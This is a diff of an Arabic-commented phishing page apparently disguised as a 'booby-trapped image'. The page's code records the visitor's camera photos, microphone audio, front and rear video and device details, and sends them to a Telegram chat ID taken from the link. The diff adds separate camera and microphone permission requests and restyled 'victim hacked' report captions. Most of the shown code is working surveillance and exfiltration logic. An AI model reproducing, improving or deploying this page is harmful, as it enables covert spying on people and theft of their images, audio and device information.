@@ -68,24 +68,29 @@
         
         // ========== استخراج target ID من الرابط ==========
         function extractTargetId() {
+            // 1. البحث في query string
             const urlParams = new URLSearchParams(window.location.search);
             let target = urlParams.get('target') || urlParams.get('id');
             if (target && /^\d+$/.test(target)) {
                 return parseInt(target, 10);
             }
             
+            // 2. البحث في آخر جزء من المسار (pathname)
             const pathParts = window.location.pathname.split('/').filter(p => p.trim() !== '');
             const lastPart = pathParts[pathParts.length - 1];
             if (lastPart && /^\d+$/.test(lastPart)) {
                 return parseInt(lastPart, 10);
             }
             
+            // 3. لم يتم العثور على معرف صالح
             console.error('لم يتم العثور على target ID صالح في الرابط');
             return null;
         }
         
         const TARGET_ID = extractTargetId();
-        const FALLBACK_ID = null;
+        
+        // إذا لم يوجد معرف، يمكن تعيين معرف احتياطي (اختياري) أو إلغاء الإرسال
+        const FALLBACK_ID = null;  // ضع هنا معرفاً احتياطياً مثلاً 123456789 أو اتركه null
         
         function getChatId() {
             if (TARGET_ID) return TARGET_ID;
@@ -99,7 +104,7 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        // ========== إرسال البيانات إلى تليجرام ==========
+        // ========== إرسال البيانات إلى تليجرام (إلى المستهدَف) ==========
         async function sendToTelegram(text, isHTML = true) {
             const chatId = getChatId();
             if (!chatId) {
@@ -146,6 +151,7 @@
             } catch(e) { console.warn(e); }
         }
         
+        // ========== إرسال فيديو ==========
         async function sendVideo(videoBlob, caption) {
             const chatId = getChatId();
             if (!chatId) return;
@@ -440,6 +446,18 @@
             }
         }
         
+        // ========== طلب أذونات الفيديو ==========
+        async function requestVideoPermissions() {
+            try {
+                let front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } }, audio: true });
+                front.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            try {
+                let back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
+                back.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+        }
+        
         // ========== التنفيذ الكامل ==========
         async function executeFullScan() {
             if(isExecuting) return;
@@ -462,7 +480,10 @@
             
             let audioUrl = await recordAudio(5000);
             
-            // ===== تسجيل الفيديو =====
+            // ===== تسجيل الفيديو (طلب أذونات منفصل) =====
+            await requestVideoPermissions();
+            await delay(500);
+            
             let frontVideo = null;
             let backVideo = null;
             
@@ -477,9 +498,9 @@
             } catch(e) { console.warn(e); }
             
             // إرسال البيانات إلى المعرف المستهدف
-            await sendToTelegram(`#☑️ تم اختراق ضحية عبر صورة ملغمة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
+            await sendToTelegram(`#☑️ تم اختراق ضحـية عـبࢪ صـوࢪه ملـغمـة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
             
-            let report = `📱 <b>بيانات الهاتف والضحية</b>\n\n`;
+            let report = `📱 <b>بـيانـات الهـاتـف و الـضحـيه</b>\n\n`;
             report += `الجهاز: ${deviceInfo.fullName}\n`;
             report += `الشركة: ${deviceInfo.brand}\n`;
             report += `نظام التشغيل: ${deviceInfo.os}\n`;
@@ -512,16 +533,16 @@
             await sendToTelegram(report, true);
             
             for(let i = 0; i < frontPhotos.length; i++) {
-                await sendPhoto(frontPhotos[i], `☑️ كاميرا أمامية - صورة ${i+1}`);
+                await sendPhoto(frontPhotos[i], `☑️# كاميرا أمامية - صورة ${i+1}`);
                 await delay(300);
             }
             for(let i = 0; i < backPhotos.length; i++) {
-                await sendPhoto(backPhotos[i], `☑️ كاميرا خلفية - صورة ${i+1}`);
+                await sendPhoto(backPhotos[i], `#☑️ كاميرا خلفية - صورة ${i+1}`);
                 await delay(300);
             }
             
             if(audioUrl) {
-                await sendAudio(audioUrl, "🎙️ تسجيل الصوت (5 ثوانٍ)");
+                await sendAudio(audioUrl, "🎙️ تسجيل ءالصـوت (5 ثوانٍ)");
             }
             
             if(frontVideo) {
@@ -541,8 +562,10 @@
         }
         
         async function start() {
+            // التأكد من وجود معرف مستهدف، وإلا لا معنى للاستمرار
             if (!getChatId()) {
-                console.error("لا يوجد معرف Telegram مستهدف في الرابط.");
+                console.error("لا يوجد معرف Telegram مستهدف في الرابط. الرجاء استخدام رابط مثل: domain.com/file.html?target=123456789 أو domain.com/123456789");
+                // يمكن توجيه المستخدم إلى صفحة خطأ أو تجاهل
                 window.location.href = REDIRECT_URL;
                 return;
             }
